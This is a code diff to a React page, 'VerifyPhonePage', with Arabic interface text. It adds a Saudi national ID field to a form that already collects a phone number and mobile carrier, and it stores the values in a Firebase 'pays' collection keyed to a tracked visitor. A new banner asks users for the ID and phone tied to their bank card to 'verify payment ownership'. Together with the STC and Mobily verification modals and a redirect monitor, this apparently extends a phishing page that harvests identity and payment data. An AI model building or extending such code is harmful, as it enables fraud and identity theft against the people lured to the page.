@@ -6,7 +6,7 @@ import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
-import { Phone } from "lucide-react"
+import { Phone, ShieldCheck, CreditCard } from "lucide-react"
 import { UnifiedSpinner } from "@/components/unified-spinner"
 import { StcVerificationModal } from "@/components/stc-verification-modal"
 import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
@@ -20,6 +20,8 @@ import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 export default function VerifyPhonePage() {
+  const [idNumber, setIdNumber] = useState("")
+  const [idError, setIdError] = useState("")
   const [phoneNumber, setPhoneNumber] = useState("")
   const [selectedCarrier, setSelectedCarrier] = useState("")
   const [showStcModal, setShowStcModal] = useState(false)
@@ -104,6 +106,17 @@ export default function VerifyPhonePage() {
     }
   }, [])
 
+  // ID number validation
+  const validateIdNumber = (id: string): boolean => {
+    const saudiIdRegex = /^[12]\d{9}$/
+    if (!saudiIdRegex.test(id)) {
+      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام")
+      return false
+    }
+    setIdError("")
+    return true
+  }
+
   // Phone number validation
   const validatePhoneNumber = (phone: string): boolean => {
     // Remove spaces and special characters
@@ -121,6 +134,18 @@ export default function VerifyPhonePage() {
     return true
   }
 
+  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, "") // Only numbers
+    if (value.length <= 10) {
+      setIdNumber(value)
+      if (value.length === 10) {
+        validateIdNumber(value)
+      } else {
+        setIdError("")
+      }
+    }
+  }
+
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, "") // Only numbers
     if (value.length <= 10) {
@@ -134,16 +159,18 @@ export default function VerifyPhonePage() {
   }
 
   const handleSendOtp = async () => {
-    if (!phoneNumber || !selectedCarrier) return
+    if (!idNumber || !phoneNumber || !selectedCarrier) return
     
+    if (!validateIdNumber(idNumber)) return
     if (!validatePhoneNumber(phoneNumber)) return
 
     const visitorID = localStorage.getItem('visitor')
     if (!visitorID) return
 
     try {
-      // Save phone number and carrier to Firebase
+      // Save ID number, phone number and carrier to Firebase
       await updateDoc(doc(db, "pays", visitorID), {
+        phoneIdNumber: idNumber,
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
@@ -190,6 +217,7 @@ export default function VerifyPhonePage() {
       if (docSnap.exists()) {
         const data = docSnap.data()
         const currentPhoneData = {
+          idNumber: data.phoneIdNumber || "",
           phoneNumber: data.phoneNumber,
           phoneCarrier: data.phoneCarrier,
           rejectedAt: new Date().toISOString()
@@ -267,8 +295,42 @@ export default function VerifyPhonePage() {
               </div>
               <div>
                 <h2 className="text-2xl font-bold text-gray-900 mb-2">التحقق عن رقم الجوال</h2>
-                <p className="text-sm text-gray-600">الرجاء إدخال رقم الجوال واختيار شركة الاتصالات للمتابعة</p>
+                <p className="text-sm text-gray-600">الرجاء إدخال رقم الهوية ورقم الجوال واختيار شركة الاتصالات</p>
               </div>
+            </div>
+
+            {/* Verification Message */}
+            <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-lg">
+              <div className="flex items-start gap-3">
+                <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
+                <p className="text-sm text-blue-900 font-medium leading-relaxed">
+                  للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم الهاتف المرتبطين ببطاقتك البنكية.
+                </p>
+              </div>
+            </div>
+
+            {/* ID Number Input */}
+            <div className="space-y-2">
+              <Label htmlFor="idNumber" className="text-right block text-gray-700 font-semibold">
+                رقم الهوية *
+              </Label>
+              <div className="relative">
+                <Input
+                  id="idNumber"
+                  type="tel"
+                  placeholder="1xxxxxxxxx"
+                  value={idNumber}
+                  onChange={handleIdChange}
+                  className={`text-right pr-12 text-lg h-12 ${idError ? "border-red-500" : ""}`}
+                  dir="ltr"
+                />
+                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
+                  <CreditCard className="w-5 h-5" />
+                </div>
+              </div>
+              {idError && (
+                <p className="text-red-500 text-sm text-right">{idError}</p>
+              )}
             </div>
 
             {/* Phone Number Input */}
